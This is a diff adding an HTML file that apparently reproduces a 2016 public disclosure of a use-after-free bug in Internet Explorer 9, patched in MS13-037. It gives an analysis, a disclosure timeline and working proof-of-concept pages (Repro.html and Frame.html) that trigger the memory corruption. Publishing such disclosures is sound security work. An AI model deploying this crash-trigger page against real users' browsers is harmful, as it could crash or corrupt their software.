@@ -1,0 +1,63 @@
+<!--
+Source: http://blog.skylined.nl/20161208001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a memory corruption vulnerability in Microsoft Internet Explorer 9. I did not investigate this vulnerability thoroughly, so I cannot speculate on the potential impact or exploitability.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 9
+
+An attacker would need to get a target user to open a specially crafted web-page. Java­Script does not appear to be required for an attacker to triggering the vulnerable code path.
+
+Details
+
+This bug was found back when I had very little knowledge and tools to do analysis on use-after-free bugs, so I have no details to share. The EIP provided me with some details of their analysis, which I'll paraphrase here: It is a use-after-free vulnerability where the span object in the frame.html file is reused after being freed. It appears to be impossible to reallocate the freed memory before it is reused. Part of the freed memory is overwritten when it is freed because a WORD Free­Entry­Offset value is stored at offset 0. This value is then used as part of a pointer to a vftable in order to call a method. This pointer now consist of the upper 16-bits of the old vftable and the lower 16-bits contain the Free­Entry­Offset value. Exploitation is near impossible without a way to have more control over this pointer in the freed memory block. ZDI also did a more thorough analysis and provide very similar details in their advisory. I have included a number of reports created using a predecessor of Bug­Id below.
+
+Repro.html:
+-->
+
+<html>
+  <body onload="location.reload();">
+    <iframe src="Frame.html"></iframe>
+  </body>
+</html>
+
+<!--
+Frame.html:
+
+<!doctype html>
+<html>
+  <head>
+    <style type="text/css">
+      .x{
+        display:table-caption;
+      }
+      .x:first-line{
+        text-transform:uppercase;
+      }
+    </style>
+  </head>
+  <body>
+    <a>
+      <span class="x">
+        <a>
+        </a>
+      </span>
+    </a>
+  </body>
+</html>
+
+
+Time-line
+
+27 September 2012: This vulnerability was found through fuzzing.
+3 October 2012: This vulnerability was submitted to EIP.
+11 October 2012: This vulnerability was rejected by EIP.
+2 November 2012: This vulnerability was submitted to ZDI.
+19 November 2012: This vulnerability was acquired by ZDI.
+22 January 2013: This vulnerability was disclosed to Microsoft by ZDI.
+29 May 2013: Microsoft addresses this vulnerability in MS13-037.
+8 December 2016: Details of this vulnerability are released.
+-->
